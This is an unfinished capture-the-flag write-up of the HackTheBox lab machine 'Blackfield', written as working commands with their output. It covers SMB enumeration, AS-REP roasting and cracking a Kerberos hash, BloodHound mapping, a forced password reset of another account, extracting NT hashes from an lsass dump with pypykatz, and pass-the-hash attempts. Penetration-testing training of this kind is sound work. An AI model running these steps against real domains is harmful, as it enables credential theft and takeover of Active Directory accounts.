---
layout: post
title: "HTB - Blackfield"
categories: htb
tags: smb as-rep-roasting bloodhound-python AD-pivoting_user lsass pypykatz
---

[Incomplete]

# Enumeration and penetration
Check open ports with SS
```
sudo nmap -sS --min-rate 5000 -p- -v -Pn -n 10.10.10.192 -oG allPorts
```
For discover more information about the services you have to add the -Pn to don't try discover host because the host discovering that nmap do is blocked in the machine
```
nmap -sC -sV -vvv -Pn -p53,88,135,139,389,445,593,3268,49677 -n 10.10.10.192 -oN targeted
```

```text
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-09-01 15:23:32Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48702/tcp): CLEAN (Timeout)
|   Check 2 (port 39852/tcp): CLEAN (Timeout)
|   Check 3 (port 27423/udp): CLEAN (Timeout)
|   Check 4 (port 53637/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-01T15:24:25
|_  start_date: N/A

```
## DNS (port 53)

## http (port 593)


## Samba (445, 139)
###### crackmapexec
Get information about the domain
```
crackmapexec smb 10.10.10.192
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```
List shared resources with null session
```text
smbclient -L 10.10.10.192 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

## But much better
smbmap -H 10.10.10.192 -u 'null'
[+] Guest session       IP: 10.10.10.192:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
```
###### rpcclient 
This don't work without credentials...
```
rpcclient -U "" 10.10.10.192 -N
```

###### smbclient & smbmap
We have access to 'profiles$' and 'IPC\$' let's focus on profiles
```
smbclient -N //10.10.10.192/profiles$
> dir
```
And we get back a list of potential users in the domain... should we try a 
**AP-REP-ROASTING Attack**?
###### AP-REP-ROASTING
1. We add all the users to a single file
```text
>We put the output in users.txt
smbclient -N //10.10.10.192/profiles$ -c "dir" > usersRaw.txt
#check the content
cat usersRaw.txt

#REGEX to get just the names
cat usersRaw.txt | grep -oiP '[A-Z]\w++' | grep "Jun\|Wed" -v > users.txt
### i is for incase sensitive then we are not discarting the minus cases
## or you could do that using awk, just keeping th efirst awrgument
cat usersRaw.txt | awk '{print $1}' > users
```
2. We throw GetNPUsers.py
```text
sudo /home/daffi/.local/bin/GetNPUsers.py blackfield.local/ -no-pass -usersfile users | grep -v "not found"
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:37cffbd6a7190e8c9e29020f54beed13$c88a0e9ef5f0952ff343e7f25677b641a880b38ec7047dd7cd932a93efee342c800ee68ed0ab8a52bef3de5dd1384356124c980abba6783a76d45bb8e136f7fcf373e5aa44ce8fc8c6285bc9b65554783fbab2372555ecde0e67adee464874b9047ff7139b7c14b6e47c502f968a319316335eb3e0c727313f0546978e781c5e45c7446d44672839e8dcd321f3865c5130de088ba430701c291ebb21948ec8e57540c1c84d9d70cf4d2609d2daebeb4e80f5cb7dc3010036c238bb377706a9bae5e7533ad9a2ca52849f79a20e78ebc0e44523d0284d3f8e9617a26ea5f09dff367d5aafb4dcb37c8394165f8c0677d1ba07a42b
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```
And we have a hash for the 'support' user
3. Try break the hash with john
```text
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
1g 0:00:00:08 DONE (2021-09-01 11:58) 0.1212g/s 1737Kp/s 1737Kc/s 1737KC/s #1WIF3Y..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
We have then a **credentials** to access the system
support:#00^BlackKnight
To validate them:
```text
❯ crackmapexec smb 10.10.10.192 -u support -p \#00\^BlackKnight
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```
And we annalyze the scope of this user
->Remember don't escape special characters!!
```text
smbclient -L 10.10.10.192 -U 'support%#00^BlackKnight'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

## or even better

❯ smbmap -H 10.10.10.192 -u support -p #00^BlackKnight
[+] IP: 10.10.10.192:445        Name: BLACKFIELD.local                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 


```
We have READ ACCESS to:
- IPC$
- NETLOGON
- profiles$
- SYSVOL

and check rpcclient
###### rpcclient to enumerate again with credentials
This is not neccesary but havinf access with rpcclient we can enumerate users, groups and know which users belong to which group.
```
rpcclient -U "support" 10.10.10.192
>#00^BlackKnight
rpcclient $>

## list users
rpcclient $> enumdomusers -> More users to try AS-REP-Roasting Atack

# list administrators users
rpcclient $> enumdomgroups -> Searching for Domain Admins
>>	group:[Domain Admins] rid:[0x200]
	group:[Domain Users] rid:[0x201]
#using the rid we can get the rid of the users that belong to the group
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
		
#And we get information of the user using the rid
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      mié, 01 sep 2021 17:10:40 CEST
        Logoff Time              :      jue, 01 ene 1970 01:00:00 CET
        Kickoff Time             :      jue, 01 ene 1970 01:00:00 CET
        Password last set Time   :      dom, 23 feb 2020 19:09:53 CET
        Password can change Time :      lun, 24 feb 2020 19:09:53 CET
        Password must change Time:      jue, 14 sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x000017e0
        padding1[0..7]...
        logon_hrs[0..21]...
```
[hanging]

With the new validates users listed with rpcclient we could try again an AP-REP-ROASTING attack but I'll tell you that this is not working anymore, later we will checkher iterations

What can be do with credentials in plain text valid in a domain?
#### TGS attack
[This don't work in this machine]
This could return us another hash (that could be broken with john)
```
GetUsetSPN.py blackfield.local/support@10.10.10.192 -request -dc-ip 10.10.10.192
>#00^BlackKnight
```
#### bloodhound executed in remote
Get ready:
```
pip3 install bloodhound
bloodhound-python
```
Whit this you can recolect information of the domain to create a squema yo find attacks vectors.
```text
	❯ bloodhound-python -c All -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -dc dc01.blackfield.local
	INFO: Found AD domain: blackfield.local
	INFO: Connecting to LDAP server: dc01.blackfield.local
	INFO: Found 1 domains
	INFO: Found 1 domains in the forest
	INFO: Found 18 computers
	INFO: Connecting to LDAP server: dc01.blackfield.local
	INFO: Found 315 users
	INFO: Connecting to GC LDAP server: dc01.blackfield.local
	INFO: Found 51 groups
	INFO: Found 0 trusts
	INFO: Starting computer enumeration with 10 workers
	INFO: Querying computer: DC01.BLACKFIELD.local
	INFO: Done in 00M 12S
```
This information is reported in .json in the current path
We launch bloodhound in local
1. Run neo4j -> the database where the information will be stored the graph information
```
sudo neo4j console

#Open in a browser http://localhost:7474/
and if you did't change the default credentials are:
neo4j/neo4j
```
![[Pasted image 20210901130342.png]]
![[Pasted image 20210901130441.png]]

2. Run bloodhound in the background
```
bloddhound &</dev/null &
disown # to make independet the screen and the console
```
![[Pasted image 20210901130842.png]]
In the next scree just import the json information get before and you will have some like:
![[Pasted image 20210901131158.png]]
Just upload those files and refresh
 
 After let's go to annalysis and to select the user you own just go to "Finf AS REP Roastable Users" whe "support" should appear. Select that user as the owned, click over it and go to "Node Info"->
![[Pasted image 20210901134730.png]]
And we get that we can force a password change to the user audit2020
###### User pivoting
We can do this with rcpclient:
```
rpcclient -U "support" 10.10.10.192
>#00^BlackKnight
	Usage: setuserinfo2 username level password [password_expired]
	result was NT_STATUS_INVALID_PARAMETER
	rpcclient $> setuserinfo2 audit2020 24 Passw0rd!
	rpcclient $>
```
How or why we choose 24 as level?  -> https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
Check the credentials with crackmapexec
`crackmapexec smb 10.10.10.192 -u audit -p Passw0rd`
It exists correctly.

and enumerate the resources accesibles:
```text
smbmap -H 10.10.10.192 -u audit2020 -p Passw0rd!
[+] IP: 10.10.10.192:445        Name: BLACKFIELD.local                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY


```
It looks like forensic is the other folder interesting to the research
```text
smbclient //10.10.10.192/forensic -U "audit2020%Passw0rd\!"
```
We have access to some new information, you should investigate about everything there, but a tip is go to memory_analysis and download lsass.zip
`get lsass.zip` [Don't works to me]
or better
`mget lsass.zip`
What is lsass? -> ##Local Security Authority Subsystem Service

How to get information from a lsass file?
First decompress the .zip and get a lsass.DMP file and after that use pypykatz
https://github.com/skelsec/pypykatz

```
pypykatz lsa minidump lsass.DMP
```
We get information as
```text
== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [633e3]==
                luid 406499
                key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
                masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322
b6ea50effab71514f3dbeac025bdf
                sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991  

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a89550
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: Administrator
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [25869]==
                luid 153705
                key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
                masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd99
6ed660ffe648b0440d84cd97bf5a5                                                                                                
                sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9 
```

The **NT hashes **associated to each account allow us try a **pass-the-hash atack **to authenticate in the domain
We try with administrator
`crackmapexec smb 10.10.10.192 -u 'administrator' -H '7f1e4ff8c6a8e6b6fcae2d9c0572cd62'`
I afraid that it don't works
Let's try with svc_backup
`crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'`
This user exists!


**new credentials:**
With the NT hash (to do pass the hash)
svc_backup:9658d1d1dcd9250115e2205d9f48400d


Whit this credentials we should have access through winrm but the service look like have problem and if you check the ports the port 5985 is not open so at the moment I'm going to leave this machine here and retry soon.





